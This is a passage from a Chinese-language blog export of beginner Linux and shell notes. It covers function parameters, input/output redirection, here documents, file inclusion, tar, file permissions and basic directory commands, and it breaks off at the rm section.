<h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 $n 的形式来获取参数的值，例如，$1表示第一个参数，$2表示第二个参数…</p>
<p>带参数的函数示例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">funWithParam()&#123;</span><br><span class="line">    echo &quot;第一个参数为 $1 !&quot;</span><br><span class="line">    echo &quot;第二个参数为 $2 !&quot;</span><br><span class="line">    echo &quot;第十个参数为 $10 !&quot;</span><br><span class="line">    echo &quot;第十个参数为 $&#123;10&#125; !&quot;</span><br><span class="line">    echo &quot;第十一个参数为 $&#123;11&#125; !&quot;</span><br><span class="line">    echo &quot;参数总数有 $# 个!&quot;</span><br><span class="line">    echo &quot;作为一个字符串输出所有参数 $* !&quot;</span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 34 !</span><br><span class="line">第十一个参数为 73 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !</span><br></pre></td></tr></table></figure></p>
<p>注意，$10 不能获取第十个参数，获取第十个参数需要${10}。当n&gt;=10时，需要使用${n}来获取参数。</p>
<p>另外，还有几个特殊字符用来处理参数：<br><img src="https://mfaying.github.io/static/images/shell/12.jpg" alt="avatar"></p>
<h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</p>
<p>重定向命令列表如下：<br><img src="https://mfaying.github.io/static/images/shell/13.jpg" alt="avatar"></p>
<h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><p>重定向一般通过在命令间插入特定的符号来实现。特别的，这些符号的语法如下所示:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command1 &gt; file1</span><br></pre></td></tr></table></figure></p>
<p>上面这个命令执行command1然后将输出的内容存入file1。</p>
<p>注意任何file1内的已经存在的内容将被新内容替代。如果要将新内容添加在文件末尾，请使用&gt;&gt;操作符。</p>
<h2 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h2><p>执行下面的 who 命令，它将命令的完整的输出重定向在用户文件中(users):<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ who &gt; users</span><br></pre></td></tr></table></figure></p>
<p>执行后，并没有在终端输出信息，这是因为输出已被从默认的标准输出设备（终端）重定向到指定的文件。</p>
<p>你可以使用 cat 命令查看文件内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat users</span><br><span class="line">_mbsetupuser console  Oct 31 17:35 </span><br><span class="line">tianqixin    console  Oct 31 17:35 </span><br><span class="line">tianqixin    ttys000  Dec  1 11:33</span><br></pre></td></tr></table></figure></p>
<p>输出重定向会覆盖文件内容，请看下面的例子：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &quot;菜鸟教程：www.runoob.com&quot; &gt; users</span><br><span class="line">$ cat users</span><br><span class="line">菜鸟教程：www.runoob.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<p>如果不希望文件内容被覆盖，可以使用 &gt;&gt; 追加到文件末尾，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &quot;菜鸟教程：www.runoob.com&quot; &gt;&gt; users</span><br><span class="line">$ cat users</span><br><span class="line">菜鸟教程：www.runoob.com</span><br><span class="line">菜鸟教程：www.runoob.com</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><p>和输出重定向一样，Unix 命令也可以从文件获取输入，语法为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command1 &lt; file1</span><br></pre></td></tr></table></figure></p>
<p>这样，本来需要从键盘获取输入的命令会转移到文件读取内容。</p>
<p>注意：输出重定向是大于号(&gt;)，输入重定向是小于号(&lt;)。<br>实例<br>接着以上实例，我们需要统计 users 文件的行数,执行以下命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wc -l users</span><br><span class="line">       2 users</span><br></pre></td></tr></table></figure></p>
<p>也可以将输入重定向到 users 文件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$  wc -l &lt; users</span><br><span class="line">       2</span><br></pre></td></tr></table></figure></p>
<p>注意：上面两个例子的结果不同：第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command1 &lt; infile &gt; outfile</span><br></pre></td></tr></table></figure></p>
<p>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中。</p>
<h2 id="重定向深入讲解"><a href="#重定向深入讲解" class="headerlink" title="重定向深入讲解"></a>重定向深入讲解</h2><p>一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：</p>
<p>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。<br>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。<br>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。<br>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>如果希望 stderr 重定向到 file，可以这样写：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command 2 &gt; file</span><br></pre></td></tr></table></figure></p>
<p>如果希望 stderr 追加到 file 文件末尾，可以这样写：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command 2 &gt;&gt; file</span><br></pre></td></tr></table></figure></p>
<p>2 表示标准错误文件(stderr)。</p>
<p>如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command &gt; file 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">$ command &gt;&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>如果希望对 stdin 和 stdout 都重定向，可以这样写：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command &lt; file1 &gt;file2</span><br></pre></td></tr></table></figure></p>
<p>command 命令将 stdin 重定向到 file1，将 stdout 重定向到 file2。</p>
<h2 id="Here-Document"><a href="#Here-Document" class="headerlink" title="Here Document"></a>Here Document</h2><p>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。</p>
<p>它的基本的形式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command &lt;&lt; delimiter</span><br><span class="line">    document</span><br><span class="line">delimiter</span><br></pre></td></tr></table></figure></p>
<p>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。<br>注意：<br>结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进。<br>开始的delimiter前后的空格会被忽略掉。</p>
<p>实例<br>在命令行中通过 wc -l 命令计算 Here Document 的行数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wc -l &lt;&lt; EOF</span><br><span class="line">    欢迎来到</span><br><span class="line">    菜鸟教程</span><br><span class="line">    www.runoob.com</span><br><span class="line">EOF</span><br><span class="line">3          # 输出结果为 3 行</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<p>我们也可以将 Here Document 用在脚本中，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; EOF</span><br><span class="line">欢迎来到</span><br><span class="line">菜鸟教程</span><br><span class="line">www.runoob.com</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p>
<p>执行以上脚本，输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">欢迎来到</span><br><span class="line">菜鸟教程</span><br><span class="line">www.runoob.com</span><br></pre></td></tr></table></figure></p>
<h2 id="dev-null-文件"><a href="#dev-null-文件" class="headerlink" title="/dev/null 文件"></a>/dev/null 文件</h2><p>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command &gt; /dev/null</span><br></pre></td></tr></table></figure></p>
<p>/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到”禁止输出”的效果。</p>
<p>如果希望屏蔽 stdout 和 stderr，可以这样写：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>注意：0 是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p>
<h2 id="Shell-文件包含"><a href="#Shell-文件包含" class="headerlink" title="Shell 文件包含"></a>Shell 文件包含</h2><p>和其他语言一样，Shell 也可以包含外部脚本。这样可以很方便的封装一些公用的代码作为一个独立的文件。</p>
<p>Shell 文件包含的语法格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. filename   # 注意点号(.)和文件名中间有一空格</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">source filename</span><br></pre></td></tr></table></figure></p>
<p>实例<br>创建两个 shell 脚本文件。</p>
<p>test1.sh 代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.runoob.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>test2.sh 代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author:菜鸟教程</span><br><span class="line"># url:www.runoob.com</span><br><span class="line"></span><br><span class="line">#使用 . 号来引用test1.sh 文件</span><br><span class="line">. ./test1.sh</span><br><span class="line"></span><br><span class="line"># 或者使用以下包含文件代码</span><br><span class="line"># source ./test1.sh</span><br><span class="line"></span><br><span class="line">echo &quot;菜鸟教程官网地址：$url&quot;</span><br></pre></td></tr></table></figure></p>
<p>接下来，我们为 test2.sh 添加可执行权限并执行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod +x test2.sh </span><br><span class="line">$ ./test2.sh </span><br><span class="line">菜鸟教程官网地址：http://www.runoob.com</span><br></pre></td></tr></table></figure></p>
<p>注：被包含的文件 test1.sh 不需要可执行权限。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Linux 命令大全</a></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>linux基础教程</title>
    <url>/2019/07/21/linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>经常会忘记 tar 压缩和解压命令的使用，故记下来。</p>
<p>　　1. 打包压缩<br>1<br>2<br>3<br>tar -zcvf pack.tar.gz pack/  #打包压缩为一个.gz格式的压缩包<br>tar -jcvf pack.tar.bz2 pack/ #打包压缩为一个.bz2格式的压缩包<br>tar -Jcvf pack.tar.xz pack/  #打包压缩为一个.xz格式的压缩包<br>　　2. 解包解压<br>1<br>2<br>3<br>tar -zxvf pack.tar.gz /pack  #解包解压.gz格式的压缩包到pack文件夹<br>tar -jxvf pack.tar.bz2 /pack #解包解压.bz2格式的压缩包到pack文件夹<br>tar -Jxvf pack.tar.xz /pack  #解包解压.xz格式的压缩包到pack文件夹</p>
<h1 id="linux常用操作"><a href="#linux常用操作" class="headerlink" title="linux常用操作"></a>linux常用操作</h1><p>Q：如何查看哪些进程占用的CPU、内存资源最多？</p>
<p>A：获取占用CPU资源最多的10个进程，可以使用如下命令组合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head</span><br></pre></td></tr></table></figure>
<p>获取占用内存资源最多的10个进程，可以使用如下命令组合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head</span><br></pre></td></tr></table></figure>
<p>Q：如何查看日志</p>
<p>A：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f log</span><br></pre></td></tr></table></figure>
<p>Q：如何查看磁盘空间</p>
<p>查看磁盘各分区大小、已用空间等信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></p>
<p>查看foo目录的大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du -sh foo</span><br></pre></td></tr></table></figure></p>
<p>有时候，硬盘比较满了，我们想找一些目录来清除，可以用下面命令查看当前目录以下搜索文件和子目录大小。找出特别大的，看里面有没有文件可删：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du -sh *</span><br></pre></td></tr></table></figure></p>
<h1 id="Linux-简介"><a href="#Linux-简介" class="headerlink" title="Linux 简介"></a>Linux 简介</h1><p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
<p>Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
<h1 id="Linux-的发行版"><a href="#Linux-的发行版" class="headerlink" title="Linux 的发行版"></a>Linux 的发行版</h1><p>Linux 的发行版说简单点就是将 Linux 内核与应用软件做一个打包。</p>
<p>目前市面上较知名的发行版有：Ubuntu、RedHat、CentOS、Debian、Fedora、SuSE、OpenSUSE、Arch Linux、SolusOS 等。</p>
<h1 id="Linux-系统启动过程"><a href="#Linux-系统启动过程" class="headerlink" title="Linux 系统启动过程"></a>Linux 系统启动过程</h1><p>Linux系统的启动过程可以分为5个阶段：</p>
<ol>
<li>内核的引导。</li>
<li>运行 init。</li>
<li>系统初始化。</li>
<li>建立终端 。</li>
<li>用户登录系统。</li>
</ol>
<h1 id="Linux-系统目录结构"><a href="#Linux-系统目录结构" class="headerlink" title="Linux 系统目录结构"></a>Linux 系统目录结构</h1><p>登录系统后，在当前命令窗口下输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[yunwei@ali-product-serverlatest-23olzrh8 ~]$ ls /</span><br><span class="line">bin   data  etc   lib    lost+found  mnt        opt   root  sbin  swapfile  temp  usr</span><br><span class="line">boot  dev   home  lib64  media       nohup.out  proc  run   srv   sys       tmp   var</span><br></pre></td></tr></table></figure>
<p>这些目录的含义参考<a href="https://www.runoob.com/linux/linux-system-contents.html" target="_blank" rel="noopener">linux系统目录结构</a></p>
<h1 id="Linux-远程登录"><a href="#Linux-远程登录" class="headerlink" title="Linux 远程登录"></a>Linux 远程登录</h1><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><p>Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@IP</span><br><span class="line">输入密码</span><br></pre></td></tr></table></figure>
<h2 id="使用密钥认证机制远程登录linux"><a href="#使用密钥认证机制远程登录linux" class="headerlink" title="使用密钥认证机制远程登录linux"></a>使用密钥认证机制远程登录linux</h2><ul>
<li>创建目录 /root/.ssh 并设置权限</li>
</ul>
<p>[root@localhost ~]# mkdir /root/.ssh</p>
<p>[root@localhost ~]# chmod 700 /root/.ssh</p>
<ul>
<li><p>创建文件 / root/.ssh/authorized_keys</p>
</li>
<li><p>使用ssh-keygen -t rsa在本机生成密钥</p>
</li>
<li><p>复制/.ssh/id_rsa.pub的内容到authorized_keys中</p>
</li>
</ul>
<h1 id="Linux-文件基本属性"><a href="#Linux-文件基本属性" class="headerlink" title="Linux 文件基本属性"></a>Linux 文件基本属性</h1><p>Linux 系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。</p>
<p>为了保护系统的安全性，Linux 系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。</p>
<p>在 Linux 中我们通常使用以下两个命令来修改文件或目录的所属用户与权限：</p>
<ul>
<li>chown (change ownerp) ： 修改所属用户与组。</li>
<li>chmod (change mode) ： 修改用户的权限。</li>
</ul>
<p>在 Linux 中我们可以使用 ll 或者 ls –l 命令来显示一个文件的属性以及文件所属的用户和组，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www /]# ls -l</span><br><span class="line">total 64</span><br><span class="line">dr-xr-xr-x   2 root root 4096 Dec 14  2012 bin</span><br><span class="line">dr-xr-xr-x   4 root root 4096 Apr 19  2012 boot</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
<p>实例中，bin 文件的第一个属性用 d 表示。d 在 Linux 中代表该文件是一个目录文件。</p>
<p>在 Linux 中第一个字符代表这个文件是目录、文件或链接文件等等。</p>
<p>当为 d 则是目录<br>当为 - 则是文件；<br>若是 l 则表示为链接文档(link file)；<br>若是 b 则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；<br>若是 c 则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。</p>
<p>接下来的字符中，以三个为一组，且均为 rwx 的三个参数的组合。其中， r 代表可读(read)、 w 代表可写(write)、 x 代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号 - 而已。</p>
<p>三组分别为属主权限（该文件的所有者）、属组权限（所有者的同组用户）、其他用户权限</p>
<p>第1、4、7位表示读权限，如果用”r”字符表示，则有读权限，如果用”-“字符表示，则没有读权限；</p>
<p>第2、5、8位表示写权限，如果用”w”字符表示，则有写权限，如果用”-“字符表示没有写权限；</p>
<p>第3、6、9位表示可执行权限，如果用”x”字符表示，则有执行权限，如果用”-“字符表示，则没有执行权限。</p>
<p>对于文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户。</p>
<p>同时，在Linux系统中，用户是按组分类的，一个用户属于一个或多个组。</p>
<p>文件所有者以外的用户又可以分为文件所有者的同组用户和其他用户。</p>
<p>因此，Linux系统按文件所有者、文件所有者同组用户和其他用户来规定了不同的文件访问权限。</p>
<p>对于 root 用户来说，一般情况下，文件的权限对其不起作用。</p>
<h2 id="更改文件属性"><a href="#更改文件属性" class="headerlink" title="更改文件属性"></a>更改文件属性</h2><h2 id="chgrp：更改文件属组"><a href="#chgrp：更改文件属组" class="headerlink" title="chgrp：更改文件属组"></a>chgrp：更改文件属组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chgrp [-R] 属组名 文件名</span><br></pre></td></tr></table></figure>
<p>-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。</p>
<h2 id="chown：更改文件属主，也可以同时更改文件属组"><a href="#chown：更改文件属主，也可以同时更改文件属组" class="headerlink" title="chown：更改文件属主，也可以同时更改文件属组"></a>chown：更改文件属主，也可以同时更改文件属组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown [–R] 属主名 文件名</span><br><span class="line">chown [-R] 属主名：属组名 文件名</span><br></pre></td></tr></table></figure>
<h2 id="chmod：更改文件9个属性"><a href="#chmod：更改文件9个属性" class="headerlink" title="chmod：更改文件9个属性"></a>chmod：更改文件9个属性</h2><p>Linux文件属性有两种设置方法，一种是数字，一种是符号。</p>
<p>Linux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限。</p>
<p>文件的权限字符为：『-rwxrwxrwx』，其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：</p>
<p>r:4<br>w:2<br>x:1</p>
<p>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数则是：</p>
<p>owner = rwx = 4+2+1 = 7<br>group = rwx = 4+2+1 = 7<br>others= — = 0+0+0 = 0</p>
<p>所以等一下我们设定权限的变更时，该文件的权限数字就是770啦！</p>
<p>变更权限的指令chmod的语法是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod [-R] xyz 文件或目录</span><br></pre></td></tr></table></figure></p>
<p>选项与参数：</p>
<p>xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。</p>
<p>-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更</p>
<h2 id="符号类型改变文件权限"><a href="#符号类型改变文件权限" class="headerlink" title="符号类型改变文件权限"></a>符号类型改变文件权限</h2><p>还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：</p>
<p>(1)user 用户<br>(2)group 组<br>(3)others 其他</p>
<p>那么我们就可以使用 u, g, o 来代表三种身份的权限！</p>
<p>此外， a 则代表 all，即全部的身份。读写的权限可以写成 r, w, x。+(加入)、-(除去)、=(设定)。</p>
<p>如果我们需要将文件权限设置为 -rwxr-xr– ，可以使用 chmod u=rwx,g=rx,o=r 文件名 来设定:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod u=rwx,g=rx,o=r test1    // 修改 test1 权限</span><br></pre></td></tr></table></figure>
<p>而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  chmod  a-x test1</span><br></pre></td></tr></table></figure>
<h1 id="Linux-文件与目录管理"><a href="#Linux-文件与目录管理" class="headerlink" title="Linux 文件与目录管理"></a>Linux 文件与目录管理</h1><p>我们知道Linux的目录结构为树状结构，最顶级的目录为根目录 /。</p>
<p>其他目录通过挂载可以将它们添加到树中，通过解除挂载可以移除它们。</p>
<h2 id="处理目录的常用命令"><a href="#处理目录的常用命令" class="headerlink" title="处理目录的常用命令"></a>处理目录的常用命令</h2><p>接下来我们就来看几个常见的处理目录的命令吧：</p>
<ul>
<li>ls（英文全拼：list files）: 列出目录及文件名</li>
<li>cd（英文全拼：change directory）：切换目录</li>
<li>pwd（英文全拼：print work directory）：显示目前的目录</li>
<li>mkdir（英文全拼：make directory）：创建一个新的目录</li>
<li>rmdir（英文全拼：remove directory）：删除一个空的目录</li>
<li>cp（英文全拼：copy file）: 复制文件或目录</li>
<li>rm（英文全拼：remove）: 删除文件或目录</li>
<li>mv（英文全拼：move file）: 移动文件与目录，或修改文件与目录的名称</li>
</ul>
<p>你可以使用 man [命令] 来查看各个命令的使用文档，如 ：man cp。</p>
<h2 id="ls-列出目录"><a href="#ls-列出目录" class="headerlink" title="ls (列出目录)"></a>ls (列出目录)</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# ls [-aAdfFhilnrRSt] 目录名称</span><br><span class="line">[root@www ~]# ls [--color=&#123;never,auto,always&#125;] 目录名称</span><br><span class="line">[root@www ~]# ls [--full-time] 目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)<br>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)<br>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</p>
<p>将家目录下的所有文件列出来(含属性与隐藏档)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# ls -al ~</span><br></pre></td></tr></table></figure>
<h2 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd (切换目录)"></a>cd (切换目录)</h2><p>cd是Change Directory的缩写，这是用来变换工作目录的命令。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd [相对路径或绝对路径]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用绝对路径切换到 runoob 目录</span><br><span class="line">[root@www ~]# cd /root/runoob/</span><br><span class="line"></span><br><span class="line">#使用相对路径切换到 runoob 目录</span><br><span class="line">[root@www ~]# cd ./runoob/</span><br><span class="line"></span><br><span class="line"># 表示回到自己的家目录，亦即是 /root 这个目录</span><br><span class="line">[root@www runoob]# cd ~</span><br><span class="line"></span><br><span class="line"># 表示去到目前的上一级目录，亦即是 /root 的上一级目录的意思；</span><br><span class="line">[root@www ~]# cd ..</span><br></pre></td></tr></table></figure>
<h2 id="pwd-显示目前所在的目录"><a href="#pwd-显示目前所在的目录" class="headerlink" title="pwd (显示目前所在的目录)"></a>pwd (显示目前所在的目录)</h2><p>pwd 是 Print Working Directory 的缩写，也就是显示目前所在目录的命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# pwd [-P]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-P ：显示出确实的路径，而非使用连结 (link) 路径。</p>
<p>实例：单纯显示出目前的工作目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# pwd</span><br><span class="line">/root   &lt;== 显示出目录啦～</span><br></pre></td></tr></table></figure>
<p>实例显示出实际的工作目录，而非连结档本身的目录名而已。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www mail]# pwd -P</span><br><span class="line">/var/spool/mail   &lt;==怎么回事？有没有加 -P 差很多～</span><br><span class="line">[root@www mail]# ls -ld /var/mail</span><br><span class="line">lrwxrwxrwx 1 root root 10 Sep  4 17:54 /var/mail -&gt; spool/mail</span><br><span class="line"># 看到这里应该知道为啥了吧？因为 /var/mail 是连结档，连结到 /var/spool/mail </span><br><span class="line"># 所以，加上 pwd -P 的选项后，会不以连结档的数据显示，而是显示正确的完整路径啊！</span><br></pre></td></tr></table></figure>
<h2 id="mkdir-创建新目录"><a href="#mkdir-创建新目录" class="headerlink" title="mkdir (创建新目录)"></a>mkdir (创建新目录)</h2><p>如果想要创建新的目录的话，那么就使用mkdir (make directory)吧。</p>
<p>语法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkdir [-mp] 目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～<br>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</p>
<p>实例：请到/tmp底下尝试创建数个新目录看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www tmp]# mkdir test1/test2/test3/test4</span><br><span class="line">mkdir: cannot create directory `test1/test2/test3/test4&apos;: </span><br><span class="line">No such file or directory       &lt;== 没办法直接创建此目录啊！</span><br><span class="line">[root@www tmp]# mkdir -p test1/test2/test3/test4</span><br></pre></td></tr></table></figure>
<p>加了这个 -p 的选项，可以自行帮你创建多层目录！</p>
<h2 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir (删除空的目录)"></a>rmdir (删除空的目录)</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rmdir [-p] 目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-p ：连同上一级『空的』目录也一起删除</p>
<p>rmdir 仅能删除空的目录，你可以使用 rm 命令来删除非空目录。</p>
<h2 id="cp-复制文件或目录"><a href="#cp-复制文件或目录" class="headerlink" title="cp (复制文件或目录)"></a>cp (复制文件或目录)</h2><p>cp 即拷贝文件和目录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cp [-adfilprsu] 来源档(source) 目标档(destination)</span><br><span class="line">[root@www ~]# cp [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)</p>
<p>-d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身；</p>
<p>-f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次；</p>
<p>-i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)</p>
<p>-l：进行硬式连结(hard link)的连结档创建，而非复制文件本身；</p>
<p>-p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)；</p>
<p>-r：递归持续复制，用於目录的复制行为；(常用)</p>
<p>-s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件；</p>
<p>-u：若 destination 比 source 旧才升级 destination ！</p>
<p>用 root 身份，将 root 目录下的 .bashrc 复制到 /tmp 下，并命名为 bashrc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cp ~/.bashrc /tmp/bashrc</span><br><span class="line">[root@www ~]# cp -i ~/.bashrc /tmp/bashrc</span><br><span class="line">cp: overwrite `/tmp/bashrc&apos;? n  &lt;==n不覆盖，y为覆盖</span><br></pre></td></tr></table></figure>
<h2 id="rm-移除文件或目录"><a href="#rm-移除文件或目录" class="headerlink" title="rm (移除文件或目录)"></a>rm (移除文件或目录)</h2><p>语法：</p>
